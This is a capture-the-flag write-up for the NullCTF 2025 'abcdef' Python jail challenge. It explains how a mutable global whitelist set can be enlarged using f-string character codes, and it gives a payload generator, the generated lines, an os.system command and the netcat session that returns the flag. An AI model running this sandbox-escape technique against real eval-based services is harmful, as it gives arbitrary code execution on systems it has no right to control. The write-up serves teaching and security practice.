# NullCTF 2025 - abcdef Challenge Writeup

**Author:** xseven  
**Difficulty:** Medium  
**Category:** Misc / Python Jail  

## Challenge Description

> The Grand Arcanist has severed the ley lines of syntax. A silence spell hangs heavy over the terminal, choking out all complex commands. The only magic that permeates the barrier is the Hex, the alphabet of the machine spirit. The interpreter will hear nothing but the six sacred runes: a, b, c, d, e, f. Can you conjure a flag from the silence?

## Intro

The "abcdef" challenge presents a restricted Python environment (a "jail") where the user can execute arbitrary Python code, but with severe constraints on the allowed character set. The challenge provides the source code of the jail, revealing that the input is validated against a strict whitelist before being passed to `eval()`. The core task is to bypass this filter to execute system commands and retrieve the flag.

## Initial Analysis

We are provided with the file `jail.py`, which implements the restricted shell.

### Source Code: `jail.py`

```python
abcdef = set("abcdef")

def is_valid(text):
    for c in text:
        if ord(c) < 32 or ord(c) > 126:
            return False
        if c.isalpha() and c not in abcdef:
            return False
    return True

try:
    while True:
        x = input("> ")
        if is_valid(x):
            eval(x)
        else:
            print("[*] Failed.")
except Exception as e:
    print(e)
    pass
```

### The Restrictions

The `is_valid` function enforces the following rules:
1.  **ASCII Range**: Only printable characters (ASCII 32-126) are allowed.
2.  **Alphabet Restriction**: If a character is a letter (`c.isalpha()`), it **must** be present in the `abcdef` set.
3.  **Initial Set**: The `abcdef` set is initialized with `{'a', 'b', 'c', 'd', 'e', 'f'}`.

This means we can use:
*   Digits: `0-9`
*   Symbols: ``! " # $ % & ' ( ) * + , - . / : ; < = > ? @ [ \ ] ^ _ ` { | } ~``
*   Letters: `a`, `b`, `c`, `d`, `e`, `f` (lowercase only)

Any other letter (like `p`, `r`, `i`, `n`, `t`, `e`, `v`, `a`, `l`, `o`, `s`) will cause `is_valid` to return `False`, preventing execution.

### The Vulnerability

The vulnerability lies in the scope and mutability of the whitelist itself.

1.  **Global Scope**: The variable `abcdef` is defined in the global scope.
2.  **Eval Context**: The `eval(x)` function executes user input in the current context, which includes the global variables.
3.  **Mutability**: `abcdef` is a Python `set`, which is a mutable object.
4.  **Allowed Identifiers**: The variable name `abcdef` consists entirely of allowed characters. The method name `add` (for sets) also consists entirely of allowed characters (`a`, `d`).

This creates a logical loop: The filter checks against `abcdef`, but we can use the allowed characters to modify `abcdef` itself. If we can add forbidden characters to this set, they become allowed for subsequent commands (or even within the same execution context if we chain commands).

## Exploitation Strategy

Our goal is to execute a standard Python payload to read the flag, such as:
```python
__import__("os").system("cat flag.txt")
```

However, this string contains many forbidden letters (`i`, `m`, `p`, `o`, `r`, `t`, `s`, `y`, `l`, `g`, `x`). We need to "unlock" these characters by adding them to the `abcdef` set.

### Generating Characters

We cannot simply type `abcdef.add("i")` because `"i"` contains the forbidden letter `i`. We need a way to generate the string `"i"` using only allowed characters.

Python's **f-strings** (formatted string literals) are the key.
*   The character `f` is allowed.
*   Quotes `"` or `'` are allowed.
*   Curly braces `{}` are allowed.
*   Inside an f-string, we can evaluate expressions.
*   Crucially, we can use **format specifiers**. The `:c` specifier converts an integer to its corresponding unicode character.

For example, the ASCII value of `'i'` is `105`.
The expression `f"{105:c}"` evaluates to the string `"i"`.

Let's check if `f"{105:c}"` is valid under the challenge rules:
*   `f`: Allowed.
*   `"`: Allowed.
*   `{`: Allowed.
*   `1`, `0`, `5`: Digits allowed.
*   `:`: Allowed.
*   `c`: Allowed.
*   `}`: Allowed.
*   `"`: Allowed.

It is perfectly valid!

### Constructing the Exploit

We can now construct a payload that iteratively adds every required character to the whitelist.

**The Plan:**
1.  Calculate the ASCII code for every forbidden letter in our target payload.
2.  Generate a line of code for each letter: `abcdef.add(f"{CODE:c}")`.
3.  Send these lines to the server.
4.  Finally, send the payload `__import__("os").system("cat flag.txt")`.

### Exploit Script (`exploit_gen.py`)

I wrote a Python script to generate the full payload automatically.

```python
chars_to_add = {
    'i': 105,
    'm': 109,
    'p': 112,
    'o': 111,
    'r': 114,
    't': 116,
    's': 115,
    'y': 121,
    'l': 108,
    'g': 103,
    'x': 120,
    'n': 110, # for print if needed, or just in case
    'u': 117, # for builtins
    'b': 98,  # already allowed
    'h': 104, # for help/chr
    'v': 118, # for eval
}

# Generate payloads to add each char
for char, code in chars_to_add.items():
    print(f'abcdef.add(f"{{{code}:c}}")')

# Final payload
print('__import__("os").system("cat flag.txt")')
```

### Generated Payload

Running the script produces the following output:

```python
abcdef.add(f"{105:c}")
abcdef.add(f"{109:c}")
abcdef.add(f"{112:c}")
abcdef.add(f"{111:c}")
abcdef.add(f"{114:c}")
abcdef.add(f"{116:c}")
abcdef.add(f"{115:c}")
abcdef.add(f"{121:c}")
abcdef.add(f"{108:c}")
abcdef.add(f"{103:c}")
abcdef.add(f"{120:c}")
abcdef.add(f"{110:c}")
abcdef.add(f"{117:c}")
abcdef.add(f"{98:c}")
abcdef.add(f"{104:c}")
abcdef.add(f"{118:c}")
__import__("os").system("cat flag.txt")
```

## Execution

We pipe this payload into the netcat connection to the challenge server.

```bash
python3 exploit_gen.py > payload.txt
cat payload.txt | nc 34.118.61.99 10963
```

**Output:**

```text
> > > > > > > > > > > > > > > > > nullctf{g!bb3r!sh_d!dnt_st0p_y0u!}
```

The server executes each `abcdef.add(...)` line silently (returning `None`), and finally executes the system command, printing the flag.

## Conclusion

This challenge demonstrates the danger of exposing mutable internal state to user-controlled code, especially when that state controls the security boundaries themselves. By leveraging the allowed subset of the language (f-strings and the `set.add` method), we were able to dynamically expand our privileges until we had full code execution capabilities.

Pwned!

KOREONE
